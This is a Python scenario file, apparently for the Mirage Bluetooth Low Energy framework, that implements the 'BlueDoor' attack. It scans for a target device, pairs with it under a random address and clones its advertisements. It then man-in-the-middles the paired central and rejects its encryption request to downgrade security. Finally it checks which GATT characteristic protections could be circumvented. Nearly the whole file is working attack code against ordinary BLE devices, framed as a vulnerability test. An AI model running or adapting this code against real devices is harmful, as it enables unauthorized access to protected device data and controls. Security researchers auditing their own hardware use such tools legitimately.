from mirage.core import scenario
from mirage.libs import io, ble, utils
from mirage.libs.ble_utils.dissectors import *
from mirage.libs.ble_utils.sc_crypto import BLECryptoSC, CryptoUtils
import configparser


class ble_blue_door(scenario.Scenario):
    def onStart(self):
        self.module.printScenarioStart("BlueDoor")

        if self.module.args["INTERFACE2"] == "":
            io.fail("This scenario requires two interfaces!")
            self.module.setStage(self.module.BLEStage.STOP)
            return
        # Disable master Bluetooth
        io.ask("Disable Bluetooth on Master. Confirm with ENTER")
        # Success status of the scenario
        self.finished = False
        self.success = self.module.ScenarioResult.NOT
        # Local and remote address
        self.localAddress = CryptoUtils.getRandomAddress()
        # Use random address as public identity address
        self.localAddressType = 1
        self.remoteAddress = None
        # For device cloning
        self.addrType = None
        self.intervalMin = None
        self.intervalMax = None
        self.dataAdvInd = None
        self.dataScanRsp = None
        # Crypto stuff
        self.sc_crypto = BLECryptoSC()
        self.remoteConfirm = None
        self.localIOCap = None
        self.remoteIOCap = None
        self.slaveIdentityAddress = None
        # Activate hooking of BLE_ENC_REQ
        self.module.addBlockedPDUsForEmitter(
            emitter=self.module.a2mEmitter, listOfBlockedPDUs=[0x03]
        )
        # Flag to indicate if authorization was successful
        self.authorized = False
        self.gatt_file = "/tmp/mirage/gatt.cfg"
        self.authorised_gatt_file = "/tmp/mirage/authorized_gatt.cfg"

        # Scan slave
        io.info("Scanning for slave")
        self.module.setStage(self.module.BLEStage.SCAN)
        self.module.a2sReceiver.setScan(enable=True)
        self.module.waitUntilStage(self.module.BLEStage.IDLE)
        self.module.a2sReceiver.setScan(enable=False)
        # Apply new address at each start
        self.module.a2sEmitter.setAddress(
            self.localAddress, random=self.localAddressType == 1
        )
        # Connect on slave
        io.info("Connect on slave")
        self.module.setStage(self.module.BLEStage.WAIT_CONN)
        self.module.connectOnSlave()
        self.module.waitUntilStage(self.module.BLEStage.IDLE)
        # Begin pairing
        io.info(
            "Pair with slave {} secure connection feature".format(
                "using"
                if utils.booleanArg(self.module.args["SECURE_CONNECTION"])
                else "without"
            )
        )
        if utils.booleanArg(self.module.args["SECURE_CONNECTION"]):
            success = self.pairSC()
        else:
            success = self.pair()
        if not success:
            self.module.setStage(self.module.BLEStage.STOP)
            return
        # Discover GATT services from slave
        io.info("Discover without master!")
        success = self.discover(
            emitter=self.module.a2sEmitter,
            interface=self.args["INTERFACE1"],
            gatt_file=self.gatt_file,
        )
        if not success:
            self.module.setStage(self.module.BLEStage.STOP)
            return
        # Clone slave
        io.info("Clone slave")
        self.module.setStage(self.module.BLEStage.CUSTOM2)
        # Enable master Bluetooth
        io.ask("Enable Bluetooth on Master. Confirm with ENTER")
        io.info("Cloned slave")
        self.module.startAdvertisingOnEmitter(
            self.module.a2mEmitter,
            self.remoteAddress,
            self.dataAdvInd,
            self.dataScanRsp,
            self.intervalMin,
            self.intervalMax,
            self.addrType,
        )
        self.masterRequestedEnc = False

        return True

    def onEnd(self, result):
        result["success"] = self.success
        result["finished"] = self.finished
        self.module.printScenarioEnd(result)
        self.module.addBlockedPDUsForEmitter(
            emitter=self.module.a2mEmitter, listOfBlockedPDUs=[]
        )
        return True

    def onKey(self, key):
        if key == "esc":
            self.module.setStage(self.module.BLEStage.STOP)
        elif key == "a":
            self.authorized = True
            io.info("Disconnect master")
            self.module.enableMitM(enable=False)
            self.module.a2mEmitter.sendp(ble.BLEDisconnect())
        return True

    def onSlaveAdvertisement(self, packet):
        if utils.addressArg(self.module.args["TARGET"]) == packet.addr.upper():
            if packet.type == "ADV_IND":
                io.info("Found corresponding advertisement !")
                self.remoteAddress = utils.addressArg(self.module.args["TARGET"])
                data = packet.getRawDatas()
                self.intervalMin = packet.intervalMin
                self.intervalMax = packet.intervalMax
                self.addrType = packet.addrType
                self.dataAdvInd = data
            elif packet.type == "SCAN_RSP":
                self.dataScanRsp = packet.getRawDatas()
            if self.dataAdvInd != None and self.dataScanRsp != None:
                self.module.setStage(self.module.BLEStage.IDLE)

    def onSlaveConnectionComplete(self, packet):
        self.module.setStage(self.module.BLEStage.IDLE)
        return True

    def onMasterCreateConnection(self, packet):
        io.info("Master connected!")
        io.info("Enable MitM")
        self.module.enableMitM(enable=True)
        return False

    def onMasterLLChannelMapInd(self, packet):
        if not self.authorized:
            self.authorized = True
            io.info("Disconnect master")
            self.module.enableMitM(enable=False)
            self.module.a2mEmitter.sendp(ble.BLEDisconnect())
        return True

    def onMasterDisconnect(self, packet):
        # Disable master Bluetooth
        io.ask("Disable Bluetooth on Master. Confirm with ENTER")
        if self.authorized:
            io.info("Master disconnected")
            io.info("Trying to discover services!")
            success = self.discover(
                emitter=self.module.a2sEmitter,
                interface=self.args["INTERFACE1"],
                gatt_file=self.authorised_gatt_file,
            )
            if success:
                self.compareCharacteristics()
                self.module.setStage(self.module.BLEStage.STOP)
        else:
            io.fail("Master disconnected to early, someting went wrong")
        return False

    def onSlaveDisconnect(self, packet):
        if self.module.getStage() != self.module.BLEStage.STOP:
            io.fail("Slave disconnected")
        return False

    def onMasterLLEncReq(self, packet):
        # Create LL control PDU to reject encryption, error code: Pin or Key missing = 0x06
        response = ble.BLELLRejectInd(error_code=b"\x06")
        io.success("Encryption was rejected")
        self.module.a2mEmitter.sendp(response)
        self.masterRequestedEnc = True
        return False

    def readCharacteristics(self, filename):
        config = configparser.ConfigParser()
        config.read(filename)
        characteristics = {}
        for element in config.sections():
            infos = config[element]
            if "type" in infos and infos.get("type") == "characteristic":
                declarationHandle = int(element, 16)
                uuid = bytes.fromhex(infos.get("uuid"))
                valueHandle = int(infos.get("valuehandle"), 16)
                value = bytes.fromhex(infos.get("value"))
                permissions = infos.get("permissions").split(",")
                security = infos.get("security")
                characteristics[declarationHandle] = {
                    "uuid": uuid,
                    "valueHandle": valueHandle,
                    "value": value,
                    "permissions": permissions,
                    "security": security,
                }
        return characteristics

    def compareCharacteristics(self):
        characteristics = self.readCharacteristics(self.gatt_file)
        authorizedCharacteristics = self.readCharacteristics(self.authorised_gatt_file)
        diffCount = 0
        propDiffCount = 0
        if len(characteristics) != len(authorizedCharacteristics):
            io.fail("Something went wrong, different characteristics...")
            return
        for declarationHandle, properties in characteristics.items():
            if not declarationHandle in authorizedCharacteristics:
                io.fail("Something went wrong, different characteristics...")
                return
            newSecurity = authorizedCharacteristics[declarationHandle]["security"]
            if properties["security"] != newSecurity and newSecurity == "None":
                diffCount += 1
            elif properties["security"] != newSecurity:
                propDiffCount += 1

        self.finished = True
        if not self.masterRequestedEnc:
            io.warning("Master never requested encryption, are the devices paired?")
        if diffCount > 0 or propDiffCount > 0:
            if propDiffCount > 0:
                io.warn(
                    "{} permissions have to be checked manually".format(propDiffCount)
                )
                self.success = self.module.ScenarioResult.MAYBE
            if diffCount > 0:
                io.fail("{} permissions could be circumvented".format(diffCount))
                self.success = self.module.ScenarioResult.VULN
            io.success(
                "Compare {} and {} for further details".format(
                    self.gatt_file, self.authorised_gatt_file
                )
            )
        else:
            io.fail("Could not downgrade security...")
            self.success = self.module.ScenarioResult.NOT
        self.module.setStage(self.module.BLEStage.STOP)

    def discover(
        self, emitter, start="0x0001", end="0xFFFF", interface="hci0", gatt_file=""
    ):
        m = utils.loadModule("ble_discover")
        m["WHAT"] = "all"
        m["INTERFACE"] = interface
        m["START_HANDLE"] = start
        m["END_HANDLE"] = end
        m["GATT_FILE"] = gatt_file
        old_verbosity_level = io.VERBOSITY_LEVEL
        io.VERBOSITY_LEVEL = io.VerbosityLevels.NO_INFO_AND_WARNING
        output = m.execute()
        io.VERBOSITY_LEVEL = old_verbosity_level
        if output["success"]:
            io.info("Service discovery successful !")
            return True
        else:
            io.fail("An error occured during service discovery !")
            return False

    def pairSC(self):
        m = utils.loadModule("ble_sc_pair")
        m["INTERFACE"] = self.args["INTERFACE1"]
        m["ADDR_TYPE"] = self.localAddressType
        m["ADDR"] = self.localAddress
        m["KEYBOARD"] = "no"
        m["YESNO"] = "no"
        m["DISPLAY"] = "no"
        m["BONDING"] = "yes"
        m["SECURE_CONNECTIONS"] = "yes"
        old_verbosity_level = io.VERBOSITY_LEVEL
        io.VERBOSITY_LEVEL = io.VerbosityLevels.NO_INFO_AND_WARNING
        output = m.execute()
        io.VERBOSITY_LEVEL = old_verbosity_level
        if output["success"]:
            io.info("Pairing enabled !")
            return True
        else:
            io.fail("An error occured during pairing !")
            return False

    def pair(self):

        m = utils.loadModule("ble_pair")
        m["INTERFACE"] = self.args["INTERFACE1"]
        m["MODE"] = "master"
        m["ACTIVE"] = "yes"
        m["ADDR_TYPE"] = "random" if self.localAddressType else "public"
        m["KEYBOARD"] = "no"
        m["ADDR"] = self.localAddress
        m["YESNO"] = "no"
        m["DISPLAY"] = "no"
        m["BONDING"] = "yes"
        m["MITM"] = "False"
        m["SECURE_CONNECTIONS"] = "yes"
        m["IRK"] = "222233445566778899aabbccddeeff"
        m["CSRK"] = "332233445566778899aabbccddeeff"
        old_verbosity_level = io.VERBOSITY_LEVEL
        io.VERBOSITY_LEVEL = io.VerbosityLevels.NO_INFO_AND_WARNING
        output = m.execute()
        io.VERBOSITY_LEVEL = old_verbosity_level
        if output["success"]:
            io.info("Pairing enabled !")
            return True
        else:
            io.fail("An error occured during pairing !")
            return False
